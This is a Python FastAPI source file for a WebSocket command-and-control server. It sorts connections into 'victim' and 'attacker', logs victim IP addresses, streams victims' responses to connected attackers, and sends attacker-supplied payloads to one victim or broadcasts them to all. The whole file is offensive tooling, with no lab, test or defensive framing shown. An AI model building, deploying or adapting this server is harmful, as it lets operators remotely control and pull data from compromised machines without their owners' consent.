from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")

victims = {}         # victim_id -> WebSocket
attackers = []       # list of attacker WebSockets
victim_counter = 0   # incremental victim ID

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    global victim_counter
    await ws.accept()
    role = await ws.receive_text()

    if role == "victim":
        victim_counter += 1
        victim_id = f"victim-{victim_counter}"
        victims[victim_id] = ws
        ip = ws.client.host
        print(f"[+] Victim connected: {victim_id} ({ip})")

        # Notify all connected attackers about this new victim
        for atk in attackers:
            try:
                await atk.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")
            except Exception as e:
                print("Error sending victim connection to attacker:", e)

        try:
            while True:
                response = await ws.receive_text()
                print(f"[🚨 From {victim_id}] {response}")
                for atk in attackers:
                    try:
                        await atk.send_text(f"[{victim_id}] {response}")
                    except Exception as e:
                        print("Error sending response to attacker:", e)
        except WebSocketDisconnect:
            del victims[victim_id]
            print(f"[-] Victim disconnected: {victim_id}")
            for atk in attackers:
                try:
                    await atk.send_text(f"[🔴] Victim disconnected: {victim_id}")
                except Exception as e:
                    print("Error sending victim disconnection to attacker:", e)

    elif role == "attacker":
        attackers.append(ws)
        print(f"[+] Attacker connected: {ws.client.host}")

        # Sync existing victims to this new attacker connection
        for victim_id, victim_ws in victims.items():
            ip = victim_ws.client.host
            try:
                await ws.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")
            except Exception as e:
                print("Error syncing victim to attacker:", e)

        try:
            while True:
                command = await ws.receive_text()

                if command.startswith("to:"):
                    # Command format: to:victim-<id>|<payload>
                    parts = command.split("|", 1)
                    victim_tag = parts[0][3:]
                    payload = parts[1]

                    if victim_tag in victims:
                        await victims[victim_tag].send_text(payload)
                    else:
                        await ws.send_text(f"[❌] Victim {victim_tag} not found")
                else:
                    # Broadcast to all victims
                    for victim_ws in victims.values():
                        try:
                            await victim_ws.send_text(command)
                        except Exception as e:
                            print("Error broadcasting command to victim:", e)
        except WebSocketDisconnect:
            attackers.remove(ws)
            print(f"[-] Attacker disconnected: {ws.client.host}")
